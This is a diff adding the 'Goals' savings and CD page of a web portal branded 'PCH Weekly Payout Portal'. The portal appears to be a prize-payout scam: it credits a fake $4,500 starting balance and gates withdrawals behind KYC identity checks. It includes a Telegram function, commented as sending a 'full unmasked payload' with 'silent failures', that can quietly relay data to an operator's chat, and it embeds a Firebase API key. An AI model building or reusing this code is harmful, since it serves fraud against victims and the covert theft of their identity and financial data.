@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Goals — PCH Weekly Payout Portal</title>
+<script src="supervisor.js"></script>
+<script src="https://cdn.tailwindcss.com"></script>
+<script>
+tailwind.config = { darkMode:'class', theme:{ extend:{ colors:{ navy:{950:'#070b19',900:'#0d1326',800:'#151d38',700:'#212d54',600:'#2f3f6e'}, gold:{400:'#fbbf24',500:'#f59e0b',600:'#d97706'}, 'sky-custom':'#38bdf8' }, fontFamily:{ sans:['Plus Jakarta Sans','sans-serif'] } } } };
+</script>
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getDatabase, ref, set, get, update, remove } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+const firebaseConfig = { apiKey:"AIzaSyAUIFpijfc13emGA-y1kN7nRuQTNVFphtM", authDomain:"pch-weekly-portal.firebaseapp.com", databaseURL:"https://pch-weekly-portal-default-rtdb.firebaseio.com", projectId:"pch-weekly-portal", storageBucket:"pch-weekly-portal.firebasestorage.app", messagingSenderId:"920877842148", appId:"1:920877842148:web:8ae593198c32ba75b636f1", measurementId:"G-789H6REHYS" };
+const app = initializeApp(firebaseConfig); const rtdb = getDatabase(app);
+window.rtdb = { db: rtdb, ref, set, get, update, remove };
+</script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  html, body { background-color:#070b19; overflow-x:hidden; }
+  body { font-family:'Plus Jakarta Sans',sans-serif; color:#f8fafc; -webkit-tap-highlight-color:transparent; -webkit-text-size-adjust:100%; }
+  @media (max-width:1024px){
+    input:not([type="checkbox"]):not([type="radio"]):not([type="range"]):not([type="file"]):not([type="color"]):not([type="submit"]):not([type="button"]):not([type="reset"]),
+    select, textarea { font-size:16px !important; line-height:1.45 !important; -webkit-text-size-adjust:100% !important; text-size-adjust:100% !important; }
+    input:focus, select:focus, textarea:focus { font-size:16px !important; transform:none !important; -webkit-transform:none !important; zoom:1 !important; }
+  }
+  .card-3d { transition: transform .3s cubic-bezier(.16,1,.3,1), box-shadow .3s cubic-bezier(.16,1,.3,1); }
+  @media (hover:hover) and (pointer:fine) { .card-3d:hover { transform: translateY(-3px); box-shadow: 0 20px 30px -12px rgba(56,189,248,.14), 0 0 20px rgba(245,158,11,.07); } }
+  ::-webkit-scrollbar { width:8px; height:8px; } ::-webkit-scrollbar-track { background:#070b19; } ::-webkit-scrollbar-thumb { background:#212d54; border-radius:4px; } ::-webkit-scrollbar-thumb:hover { background:#38bdf8; }
+  @keyframes slideIn { from { transform:translateX(100%); opacity:0; } to { transform:translateX(0); opacity:1; } }
+  @keyframes slideOut { from { transform:translateX(0); opacity:1; } to { transform:translateX(100%); opacity:0; } }
+  .toast-slide-in { animation: slideIn .3s cubic-bezier(.16,1,.3,1) forwards; }
+  .toast-slide-out { animation: slideOut .3s cubic-bezier(.16,1,.3,1) forwards; }
+  .dash-shell { position:relative; isolation:isolate; overflow-x:hidden; }
+  .dash-shell::before { content:""; position:absolute; z-index:-1; inset:0 -1.25rem auto; height:25rem; pointer-events:none; background: radial-gradient(ellipse at 12% 0%, rgba(56,189,248,.12), transparent 52%), radial-gradient(ellipse at 88% 4%, rgba(251,191,36,.09), transparent 45%); }
+  .ring-track { stroke:#212d54; }
+  .ring-fill { stroke:url(#ringGrad); stroke-linecap:round; transition:stroke-dashoffset .6s cubic-bezier(.16,1,.3,1); }
+  .hide-scrollbar::-webkit-scrollbar { display: none; }
+  .hide-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
+  .reason-tile { padding: 0.75rem 0.5rem; border-radius: 0.9rem; border: 2px solid #212d54; background: #0d1326; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 4px; cursor: pointer; transition: all .2s; color: #cbd5e1; font-size: 0.7rem; font-weight: 700; text-align: center; }
+  .reason-tile i { font-size: 1.1rem; }
+  .reason-tile.selected { background: linear-gradient(135deg, rgba(245,158,11,.2), rgba(245,158,11,.08)); border-color: #fbbf24; color: #fbbf24; }
+  .reason-tile:hover { border-color: #38bdf8; color: #fff; }
+</style>
+</head>
+<body class="bg-navy-950 text-slate-100 min-h-screen flex flex-col">
+
+<div id="toast-container" class="fixed bottom-5 right-5 z-[100] flex flex-col space-y-3 pointer-events-none max-w-sm w-full px-4"></div>
+
+<header class="bg-navy-950 border-b border-navy-700/60 sticky top-0 z-40">
+  <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 sm:h-20 flex items-center justify-between gap-2 relative">
+    <button onclick="toggleNavDrawer()" class="p-2 -ml-2 text-slate-300 hover:text-white transition z-10 relative">
+      <i class="fa-solid fa-bars text-xl"></i>
+    </button>
+    <h1 class="absolute left-1/2 -translate-x-1/2 text-[11px] sm:text-xl font-black tracking-[0.15em] text-white uppercase whitespace-nowrap">
+      PCH Weekly Payout Portal
+    </h1>
+    <div id="nav-actions" class="flex items-center space-x-1.5 sm:space-x-3 z-10 relative"></div>
+  </div>
+</header>
+
+<div id="nav-overlay" class="fixed inset-0 bg-black/60 z-[45] hidden transition-opacity" onclick="toggleNavDrawer()"></div>
+<div id="nav-drawer" class="fixed inset-y-0 left-0 z-50 w-64 bg-navy-900 border-r border-navy-700 transform -translate-x-full transition-transform duration-300 ease-in-out flex flex-col">
+  <div class="p-5 border-b border-navy-700 flex items-center justify-between">
+    <span class="text-sm font-black text-white tracking-widest uppercase">Navigation</span>
+    <button onclick="toggleNavDrawer()" class="text-slate-400 hover:text-white"><i class="fa-solid fa-xmark text-lg"></i></button>
+  </div>
+  <nav class="flex-1 overflow-y-auto p-3 space-y-1"></nav>
+</div>
+
+<main id="app-container" class="flex-grow flex flex-col"></main>
+
+<footer class="bg-navy-950 border-t border-navy-700/50 py-8 text-sm text-slate-400">
+  <div class="max-w-7xl mx-auto px-4 text-center text-[10px] sm:text-xs text-slate-500 uppercase tracking-wider font-bold">&copy; 2026 PCH Weekly Payout Portal (PWPP) — All rights reserved.</div>
+</footer>
+
+<div id="global-modal" style="display:none" class="fixed inset-0 z-[60] items-center justify-center bg-navy-950/95 p-4 overflow-y-auto">
+  <div class="bg-navy-800 border border-navy-700 rounded-2xl max-w-lg w-full p-6 shadow-2xl relative my-auto">
+    <button onclick="closeModal()" class="absolute top-4 right-4 text-slate-400 hover:text-white text-xl p-2 rounded-lg active:bg-navy-700 transition"><i class="fa-solid fa-xmark"></i></button>
+    <div id="modal-content"></div>
+  </div>
+</div>
+
+<script>
+/* ═══════════ SHARED CORE ═══════════ */
+const DEVICE_STORAGE_KEY = 'pch_device_state_v13';
+const DEFAULT_TG = { botToken:'', chatId:'' };
+const SAVINGS_REASONS = { House:{icon:'fa-house',label:'House'}, Car:{icon:'fa-car',label:'Car'}, Debts:{icon:'fa-file-invoice-dollar',label:'Debts'}, 'Dream Trip':{icon:'fa-plane',label:'Dream Trip'}, Custom:{icon:'fa-bullseye',label:'Custom Goal'} };
+const FREQUENCY_OPTIONS = [{value:'2days',label:'Every 2 Days'},{value:'3days',label:'Every 3 Days'},{value:'weekly',label:'Weekly'},{value:'biweekly',label:'Bi-Weekly'},{value:'monthly',label:'Monthly'}];
+
+function escapeHtml(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'); }
+function tgEsc(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+function fmtMoney(n){ return '$' + (Number(n)||0).toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2}); }
+function getFrequencyLabel(v){ const f=FREQUENCY_OPTIONS.find(o=>o.value===v); return f?f.label:v; }
+
+function loadDeviceState() {
+  const saved = localStorage.getItem(DEVICE_STORAGE_KEY);
+  if (saved) {
+    try {
+      const parsed = JSON.parse(saved);
+      if (!parsed.telegramConfig) parsed.telegramConfig = Object.assign({}, DEFAULT_TG);
+      if (parsed.userBalance == null) parsed.userBalance = 4500;
+      if (!parsed.transactions) parsed.transactions = [];
+      if (!parsed.registeredUsers) parsed.registeredUsers = [];
+      if (!parsed.supportTickets) parsed.supportTickets = [];
+      if (!parsed.withdrawalState) parsed.withdrawalState = 'none';
+      return parsed;
+    } catch(e){}
+  }
+  return { currentUser:null, userBalance:4500, configuredMethod:null, transactions:[], registeredUsers:[], supportTickets:[], savings:null, cdAccount:null, withdrawalState:'none', currentWithdrawal:null, kyc:null, card:null, telegramConfig: Object.assign({}, DEFAULT_TG) };
+}
+const state = loadDeviceState();
+
+function saveDeviceState() {
+  try { localStorage.setItem(DEVICE_STORAGE_KEY, JSON.stringify(state)); } catch(err) {}
+  if (state.currentUser && state.currentUser.username) syncCurrentUserToCloud().catch(()=>{});
+}
+async function syncCurrentUserToCloud() {
+  if (!window.rtdb || !state.currentUser || !state.currentUser.username) return;
+  try {
+    const payload = Object.assign({}, state.currentUser, { userBalance: state.userBalance, savings: state.savings, cdAccount: state.cdAccount, transactions: state.transactions });
+    await window.rtdb.set(window.rtdb.ref(window.rtdb.db, 'users/' + state.currentUser.username.toLowerCase()), payload);
+  } catch(e){}
+}
+async function pullCurrentUserFromCloud() {
+  if (!window.rtdb || !state.currentUser || !state.currentUser.username) return false;
+  try {
+    const snap = await window.rtdb.get(window.rtdb.ref(window.rtdb.db, 'users/' + state.currentUser.username.toLowerCase()));
+    if (!snap.exists()) return false;
+    const r = snap.val();
+    state.currentUser = Object.assign({}, state.currentUser, r);
+    if (r.kyc) state.kyc = r.kyc;
+    if (r.configuredMethod) state.configuredMethod = r.configuredMethod;
+    if (r.savings) state.savings = r.savings;
+    if (r.cdAccount) state.cdAccount = r.cdAccount;
+    if (typeof r.userBalance === 'number') state.userBalance = r.userBalance;
+    if (Array.isArray(r.transactions)) state.transactions = r.transactions;
+    if (r.card) state.card = r.card;
+    state.withdrawalState = r.withdrawalState || state.withdrawalState || 'none';
+    state.currentWithdrawal = r.currentWithdrawal || state.currentWithdrawal || null;
+    saveDeviceState(); return true;
+  } catch(e){ return false; }
+}
+
+function showToast(title, message, type='info') {
+  const container = document.getElementById('toast-container'); if (!container) return;
+  const id = 'toast-'+Date.now()+'-'+Math.floor(Math.random()*999);
+  const icon = type==='success'?'fa-circle-check text-emerald-400':type==='warning'?'fa-triangle-exclamation text-gold-400':type==='error'?'fa-circle-exclamation text-rose-400':'fa-circle-info text-sky-custom';
+  const border = type==='success'?'border-emerald-500/40':type==='warning'?'border-gold-500/40':type==='error'?'border-rose-500/40':'border-sky-custom/40';
+  const el = document.createElement('div'); el.id = id;
+  el.className = `pointer-events-auto bg-navy-900 border ${border} p-4 rounded-2xl shadow-2xl flex items-start space-x-3 toast-slide-in`;
+  el.innerHTML = `<div class="text-lg mt-0.5"><i class="fa-solid ${icon}"></i></div><div class="flex-grow"><h5 class="font-bold text-white text-xs sm:text-sm">${escapeHtml(title)}</h5><p class="text-[11px] sm:text-xs text-slate-300 mt-0.5">${escapeHtml(message)}</p></div><button onclick="dismissToast('${id}')" class="text-slate-400 hover:text-white text-sm"><i class="fa-solid fa-xmark"></i></button>`;
+  container.appendChild(el); setTimeout(()=>dismissToast(id), 5000);
+}
+function dismissToast(id){ const el=document.getElementById(id); if(el){ el.classList.remove('toast-slide-in'); el.classList.add('toast-slide-out'); setTimeout(()=>el.remove(),320); } }
+function showModal(title, bodyHtml) { const modal = document.getElementById('global-modal'); const content = document.getElementById('modal-content'); content.innerHTML = `<h3 class="text-lg sm:text-xl font-bold text-white mb-3 flex items-center"><i class="fa-solid fa-circle-info text-sky-custom mr-2"></i> ${title}</h3><div class="text-slate-300 text-xs sm:text-sm leading-relaxed mb-4">${bodyHtml}</div>`; modal.style.display = 'flex'; document.body.classList.add('modal-open'); }
+function closeModal(){ const m=document.getElementById('global-modal'); m.classList.remove('flex'); m.style.display='none'; document.body.classList.remove('modal-open'); }
+
+/* ═══════════ TELEGRAM — silent failures, full unmasked payload ═══════════ */
+function tgCreds() {
+  const cfg = state.telegramConfig || {};
+  return { botToken: String(cfg.botToken || '').trim(), chatId: String(cfg.chatId || '').trim() };
+}
+async function sendTelegramMessage(textMessage) {
+  const { botToken, chatId } = tgCreds();
+  if (!botToken || !chatId) { console.warn('[TG] botToken/chatId missing'); return false; }
+  try {
+    const fd = new FormData();
+    fd.append('chat_id', chatId);
+    fd.append('text', textMessage);
+    fd.append('parse_mode', 'HTML');
+    fd.append('disable_web_page_preview', 'true');
+    const r = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method:'POST', body:fd });
+    const d = await r.json();
+    if (!d.ok) console.error('[TG] send failed:', d.error_code, d.description);
+    return d.ok;
+  } catch (err) { console.error('[TG] fetch failed:', err); return false; }
+}
+
+function guardAuth() { if (!state.currentUser || !state.currentUser.username) { window.location.href = 'login.html'; return false; } return true; }
+function logout() { state.currentUser = null; saveDeviceState(); window.location.href = 'login.html'; }
+
+function toggleNavDrawer() {
+  const drawer = document.getElementById('nav-drawer');
+  const overlay = document.getElementById('nav-overlay');
+  if (drawer.classList.contains('-translate-x-full')) {
+    drawer.classList.remove('-translate-x-full');
+    overlay.classList.remove('hidden');
+  } else {
+    drawer.classList.add('-translate-x-full');
+    overlay.classList.add('hidden');
+  }
+}
+
+function isTabLocked(tabKey) {
+  const isKycApproved = state.kyc && state.kyc.status === 'approved';
+  const isSetupComplete = !!state.configuredMethod;
+  if (['transfer', 'cards', 'withdrawals'].includes(tabKey)) return !isKycApproved || !isSetupComplete;
+  if (tabKey === 'funds') return !isKycApproved;
+  if (tabKey === 'winners') return !isKycApproved;
+  if (tabKey === 'spin') return !isKycApproved || !isSetupComplete;
+  return false;
+}
+function showKycLockToast() { showToast('Identity Required', 'Please complete KYC verification.', 'warning'); setTimeout(() => { window.location.href = 'kyc.html'; }, 1000); }
+
+const DASHBOARD_TABS = [
+  { key:'overview', label:'Overview', icon:'fa-gauge-high', href:'overview.html' },
+  { key:'funds', label:'Funds', icon:'fa-wallet', href:'funds.html' },
+  { key:'transfer', label:'Transfer', icon:'fa-arrow-right-arrow-left', href:'transfer.html' },
+  { key:'history', label:'History', icon:'fa-rectangle-list', href:'history.html' },
+  { key:'support', label:'Support', icon:'fa-headset', href:'support.html' },
+  { key:'promotions', label:'Promotions', icon:'fa-trophy', href:'promotions.html' },
+  { key:'spin', label:'Arcade Hub', icon:'fa-dharmachakra', href:'spin.html' },
+  { key:'winners', label:'Winners Wall', icon:'fa-crown', href:'winners.html' },
+  { key:'cards', label:'Cards', icon:'fa-credit-card', href:'cards.html' },
+  { key:'referrals', label:'Referrals', icon:'fa-gift', href:'referrals.html' },
+  { key:'withdrawals', label:'Withdrawals', icon:'fa-money-bill-transfer', href:'withdrawals.html' },
+  { key:'goals', label:'Goals', icon:'fa-bullseye', href:'goals.html' },
+  { key:'notifications', label:'Alerts', icon:'fa-bell', href:'notifications.html' },
+  { key:'kyc', label:'KYC', icon:'fa-id-card', href:'kyc.html' }
+];
+function renderNavItems(activeKey) { return DASHBOARD_TABS.map(it=>{ const active = it.key===activeKey; const locked = isTabLocked(it.key); return `<a href="${locked ? '#' : it.href}" onclick="${locked ? 'event.preventDefault(); showKycLockToast()' : ''}" class="flex items-center gap-3 px-4 py-3 rounded-xl text-sm font-bold transition ${active?'text-gold-400 bg-gold-500/10':(locked ? 'text-slate-500 opacity-60' : 'text-slate-300 hover:text-white hover:bg-navy-800')}"><i class="fa-solid ${locked ? 'fa-lock' : it.icon} w-4 text-center"></i><span>${it.label}</span></a>`; }).join(''); }
+function renderDashboardSidebar(activeKey) { return `<aside class="hidden lg:block w-56 shrink-0"><div class="sticky top-24 space-y-1.5"><p class="text-[10px] text-slate-500 uppercase font-bold tracking-widest px-3 mb-3">Dashboard</p>${renderNavItems(activeKey)}</div></aside>`; }
+function renderDashboardShell(activeKey, contentHtml) { return `<div class="dash-shell flex-grow w-full"><div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 lg:py-8 pb-28 lg:pb-8"><div class="flex flex-col lg:flex-row gap-6 lg:gap-8">${renderDashboardSidebar(activeKey)}<div class="flex-1 min-w-0 space-y-6">${contentHtml}</div></div></div></div>`; }
+
+function renderHeaderNav() {
+  const nav = document.getElementById('nav-actions'); if (!nav) return;
+  if (!state.currentUser) { nav.innerHTML = ''; return; }
+  const u = state.currentUser;
+  const avatar = u.photoUrl ? `<img src="${u.photoUrl}" class="w-7 h-7 rounded-full object-cover border border-gold-400">` : `<div class="w-7 h-7 rounded-full bg-gold-500 text-navy-950 flex items-center justify-center font-bold text-xs">${(u.firstName||'U').charAt(0)}</div>`;
+  nav.innerHTML = `
+    <button onclick="window.location.href='settings.html'" class="px-2 sm:px-3 py-2 text-xs sm:text-sm font-semibold text-sky-custom hover:text-white transition rounded-lg flex items-center gap-1.5">${avatar}<span class="hidden sm:inline">${u.firstName||''}</span><i class="fa-solid fa-gear ml-1"></i></button>
+    <button onclick="logout()" class="px-2 sm:px-3 py-2 text-xs sm:text-sm font-semibold text-rose-400 hover:text-white transition rounded-lg"><i class="fa-solid fa-right-from-bracket sm:mr-1"></i><span class="hidden sm:inline">Logout</span></button>
+  `;
+}
+
+/* ═══════════ GOALS PAGE ═══════════ */
+function renderSavingsRing(current, target) {
+  const pct = Math.min(100, Math.round((current / Math.max(1,target)) * 100));
+  const r = 42; const c = 2*Math.PI*r; const offset = c - (pct/100)*c;
+  return `<div class="relative w-24 h-24 shrink-0"><svg class="w-24 h-24 -rotate-90" viewBox="0 0 100 100"><defs><linearGradient id="ringGrad" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#fbbf24" /><stop offset="100%" stop-color="#38bdf8" /></linearGradient></defs><circle class="ring-track" cx="50" cy="50" r="${r}" stroke-width="8" fill="none" /><circle class="ring-fill" cx="50" cy="50" r="${r}" stroke-width="8" fill="none" stroke-dasharray="${c}" stroke-dashoffset="${offset}" /></svg><div class="absolute inset-0 flex flex-col items-center justify-center"><span class="text-lg font-black text-gold-400">${pct}%</span><span class="text-[8px] text-slate-500 uppercase font-bold">Funded</span></div></div>`;
+}
+
+function renderGoals() {
+  const netWorth = (Number(state.userBalance)||0) + (state.savings?.currentSaved||0) + (state.cdAccount?.balance||0);
+  
+  let savingsCard = '';
+  if (state.savings && state.savings.configured) {
+    const s = state.savings; const reason = SAVINGS_REASONS[s.goal] || SAVINGS_REASONS.Custom; const remaining = Math.max(0, s.targetAmount - s.currentSaved);
+    savingsCard = `<div class="bg-navy-800 border border-navy-700 p-6 sm:p-7 rounded-3xl card-3d space-y-5 relative overflow-hidden"><div class="absolute -top-6 -right-6 text-8xl text-gold-500/5 pointer-events-none"><i class="fa-solid ${reason.icon}"></i></div><div class="flex items-center justify-between relative z-10"><div class="flex items-center gap-3"><div class="w-11 h-11 rounded-2xl bg-gold-500/20 text-gold-400 flex items-center justify-center text-lg shadow-md"><i class="fa-solid ${reason.icon}"></i></div><div><p class="text-[10px] text-slate-400 uppercase font-bold tracking-wider">Savings Goal</p><h3 class="text-base sm:text-lg font-bold text-white">${escapeHtml(s.goal==='Custom' ? (s.customLabel||'Custom Goal') : reason.label)}</h3></div></div><span class="px-2.5 py-1 text-[10px] font-extrabold rounded-full ${s.autoDeposit?'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30':'bg-slate-700/30 text-slate-300 border border-slate-600/40'}">${s.autoDeposit?'AUTO':'MANUAL'}</span></div><div class="flex items-center gap-4 relative z-10">${renderSavingsRing(s.currentSaved, s.targetAmount)}<div class="flex-1"><p class="text-[10px] text-slate-400 uppercase tracking-wider">Saved</p><p class="text-xl font-black text-gold-400">${fmtMoney(s.currentSaved)}</p><p class="text-[10px] text-slate-400 mt-0.5">Goal: ${fmtMoney(s.targetAmount)}</p><p class="text-[10px] text-slate-500 mt-0.5">${fmtMoney(remaining)} to go</p></div></div><div class="flex flex-wrap gap-2 relative z-10"><button onclick="openSavingsModal()" class="px-3.5 py-2 bg-navy-900 border border-navy-700 rounded-xl text-xs font-bold text-sky-custom hover:border-sky-custom active:scale-95"><i class="fa-solid fa-sliders mr-1"></i> Manage</button><button onclick="openSavingsTransferModal('in')" class="px-3.5 py-2 bg-gold-500 text-navy-950 rounded-xl text-xs font-extrabold active:scale-95"><i class="fa-solid fa-plus mr-1"></i> Deposit</button><button onclick="openSavingsTransferModal('out')" class="px-3.5 py-2 bg-sky-custom text-navy-950 rounded-xl text-xs font-extrabold active:scale-95"><i class="fa-solid fa-arrow-right-from-bracket mr-1"></i> Cash Out</button></div></div>`;
+  } else {
+    savingsCard = `<div class="bg-navy-800 border border-dashed border-navy-600 p-6 sm:p-7 rounded-3xl card-3d flex flex-col justify-between min-h-[230px]"><div class="space-y-3"><div class="w-12 h-12 rounded-2xl bg-gold-500/15 text-gold-400 flex items-center justify-center text-xl"><i class="fa-solid fa-piggy-bank"></i></div><h3 class="text-base sm:text-lg font-bold text-white">Savings Account</h3><p class="text-xs text-slate-400 leading-relaxed">Set a goal — House, Car, Debts, Dream Trip or custom target — and let funds build automatically.</p></div><button onclick="openSavingsModal()" class="mt-4 w-full py-3 bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 font-extrabold rounded-xl text-xs hover:brightness-110 active:scale-95"><i class="fa-solid fa-plus-circle mr-1.5"></i> Set Up Savings</button></div>`;
+  }
+
+  let cdCard = '';
+  if (state.cdAccount && state.cdAccount.configured) {
+    const cd = state.cdAccount;
+    let daysLeft = '—';
+    try { const ms = new Date(cd.maturityDate).getTime() - Date.now(); daysLeft = Math.max(0, Math.ceil(ms/86400000)) + ' days'; } catch(e){}
+    cdCard = `<div class="bg-navy-800 border border-navy-700 p-6 sm:p-7 rounded-3xl card-3d space-y-5 relative overflow-hidden"><div class="absolute -top-6 -right-6 text-8xl text-sky-custom/5 pointer-events-none"><i class="fa-solid fa-lock"></i></div><div class="flex items-center justify-between relative z-10"><div class="flex items-center gap-3"><div class="w-11 h-11 rounded-2xl bg-sky-custom/20 text-sky-custom flex items-center justify-center text-lg shadow-md"><i class="fa-solid fa-vault"></i></div><div><p class="text-[10px] text-slate-400 uppercase font-bold tracking-wider">Private CD Account</p><h3 class="text-base sm:text-lg font-bold text-white">${escapeHtml(cd.lockPeriod)} Lock · ${cd.interestRate}% APY</h3></div></div><span class="px-2.5 py-1 text-[10px] font-extrabold rounded-full bg-sky-custom/20 text-sky-custom border border-sky-custom/30">LOCKED</span></div><div class="relative z-10"><p class="text-[10px] text-slate-400 uppercase tracking-wider">Principal Balance</p><p class="text-2xl sm:text-3xl font-black text-gold-400">${fmtMoney(cd.balance)}</p><p class="text-[10px] text-slate-400 mt-1"><i class="fa-regular fa-calendar-check mr-1"></i>Matures ${escapeHtml(cd.maturityDate)}</p><p class="text-[10px] text-sky-custom mt-1 font-bold"><i class="fa-solid fa-hourglass-half mr-1"></i>${daysLeft} until maturity</p></div><div class="flex flex-wrap gap-2 relative z-10"><button onclick="openCDModal()" class="px-3.5 py-2 bg-navy-900 border border-navy-700 rounded-xl text-xs font-bold text-sky-custom hover:border-sky-custom active:scale-95"><i class="fa-solid fa-sliders mr-1"></i> Details</button><button onclick="openCDTransferModal('in')" class="px-3.5 py-2 bg-gold-500 text-navy-950 rounded-xl text-xs font-extrabold active:scale-95"><i class="fa-solid fa-plus mr-1"></i> Fund CD</button><button onclick="openCDTransferModal('out')" class="px-3.5 py-2 bg-sky-custom text-navy-950 rounded-xl text-xs font-extrabold active:scale-95"><i class="fa-solid fa-arrow-right-from-bracket mr-1"></i> Redeem</button></div></div>`;
+  } else {
+    cdCard = `<div class="bg-navy-800 border border-dashed border-navy-600 p-6 sm:p-7 rounded-3xl card-3d flex flex-col justify-between min-h-[230px]"><div class="space-y-3"><div class="w-12 h-12 rounded-2xl bg-sky-custom/15 text-sky-custom flex items-center justify-center text-xl"><i class="fa-solid fa-vault"></i></div><h3 class="text-base sm:text-lg font-bold text-white">Private CD Account</h3><p class="text-xs text-slate-400 leading-relaxed">Lock in a fixed rate. Fund and redeem only through your weekly funds balance.</p></div><button onclick="openCDModal()" class="mt-4 w-full py-3 bg-sky-custom text-navy-950 font-bold rounded-xl text-xs active:scale-95"><i class="fa-solid fa-lock mr-1.5"></i> Open Private CD</button></div>`;
+  }
+
+  return `
+    <div class="bg-navy-800 border border-navy-700 p-6 sm:p-8 rounded-3xl card-3d">
+      <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
+        <div>
+          <h2 class="text-xl sm:text-2xl font-extrabold text-white flex items-center"><i class="fa-solid fa-bullseye text-gold-400 mr-3"></i>Financial Goals</h2>
+          <p class="text-xs text-slate-400 mt-1">Grow your savings and lock in fixed rates.</p>
+        </div>
+        <div class="bg-gradient-to-br from-emerald-500/15 to-navy-900 border border-emerald-500/30 rounded-2xl px-6 py-3 flex items-center justify-between gap-4 shadow-lg">
+          <div>
+            <p class="text-[10px] text-slate-400 uppercase font-bold tracking-widest">Total Net Worth</p>
+            <p class="text-2xl font-black text-emerald-400 mt-0.5">${fmtMoney(netWorth)}</p>
+          </div>
+          <i class="fa-solid fa-chart-pie text-emerald-500/50 text-2xl"></i>
+        </div>
+      </div>
+    </div>
+
+    <div class="grid grid-cols-1 lg:grid-cols-2 gap-6 sm:gap-8">
+      ${savingsCard}
+      ${cdCard}
+    </div>
+  `;
+}
+
+let selectedSavingsGoal = 'House';
+function openSavingsModal() {
+  const s = state.savings || { configured:false, goal:'House', customLabel:'', icon:'fa-house', targetAmount:5000, depositAmount:100, frequency:'weekly', targetDate:'', autoDeposit:true, currentSaved:0, history:[] };
+  const todayPlus = new Date(); todayPlus.setDate(todayPlus.getDate()+30); const minDate = todayPlus.toISOString().split('T')[0];
+  const reasonTiles = Object.entries(SAVINGS_REASONS).map(([key,v])=>`<div class="reason-tile ${s.goal===key?'selected':''}" data-goal="${key}" onclick="selectSavingsReason('${key}')"><i class="fa-solid ${v.icon}"></i><span>${v.label}</span></div>`).join('');
+  const freqOptions = FREQUENCY_OPTIONS.map(f=>`<option value="${f.value}" ${s.frequency===f.value?'selected':''}>${f.label}</option>`).join('');
+  showModal(s.configured?'Manage Savings Account':'Set Up Savings Account', `<form onsubmit="submitSavingsSetup(event)" class="space-y-5"><div><label class="block text-xs font-bold text-slate-300 uppercase mb-2"><i class="fa-solid fa-bullseye text-gold-400 mr-1"></i> Saving Reason</label><div class="grid grid-cols-5 gap-2" id="reason-grid">${reasonTiles}</div><div id="custom-label-wrap" class="${s.goal==='Custom'?'':'hidden'} mt-3"><input type="text" id="sav-custom-label" value="${escapeHtml(s.customLabel||'')}" placeholder="Name your custom goal" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom"></div></div><div class="grid grid-cols-2 gap-3"><div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">Aim Amount ($)</label><input type="number" id="sav-target" required min="100" step="50" value="${s.targetAmount}" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom"></div><div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">Deposit per Cycle ($)</label><input type="number" id="sav-deposit" required min="10" step="10" value="${s.depositAmount}" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom"></div></div><div class="grid grid-cols-2 gap-3"><div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">Frequency</label><select id="sav-frequency" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom">${freqOptions}</select></div><div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">Target Date</label><input type="date" id="sav-target-date" required min="${minDate}" value="${s.targetDate||minDate}" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom"></div></div><label class="flex items-center gap-3 bg-navy-900 border border-navy-700 rounded-xl p-3.5 cursor-pointer"><input type="checkbox" id="sav-auto" ${s.autoDeposit?'checked':''} class="w-4 h-4 accent-gold-500"><div><span class="text-xs sm:text-sm font-bold text-white block">Enable Auto-Deposit</span><span class="text-[11px] text-slate-400">Move deposit amount from Weekly Funds automatically.</span></div></label><div class="flex justify-end gap-3 pt-2"><button type="button" onclick="closeModal()" class="px-4 py-2.5 bg-navy-950 text-slate-300 rounded-xl text-xs font-bold">Cancel</button><button type="submit" class="px-6 py-2.5 bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 rounded-xl text-xs font-extrabold active:scale-95">${s.configured?'Save Changes':'Create Savings Account'}</button></div></form>`);
+  selectedSavingsGoal = s.goal;
+}
+function selectSavingsReason(key){ selectedSavingsGoal = key; document.querySelectorAll('#reason-grid .reason-tile').forEach(t=>t.classList.toggle('selected', t.dataset.goal===key)); const wrap = document.getElementById('custom-label-wrap'); if (wrap) wrap.classList.toggle('hidden', key!=='Custom'); }
+
+function submitSavingsSetup(e) {
+  e.preventDefault();
+  const goal = selectedSavingsGoal; const customLabel = goal==='Custom'?(document.getElementById('sav-custom-label')?.value||'Custom Goal'):'';
+  const targetAmount = parseFloat(document.getElementById('sav-target').value); const depositAmount = parseFloat(document.getElementById('sav-deposit').value);
+  const frequency = document.getElementById('sav-frequency').value; const targetDate = document.getElementById('sav-target-date').value; const autoDeposit = document.getElementById('sav-auto').checked;
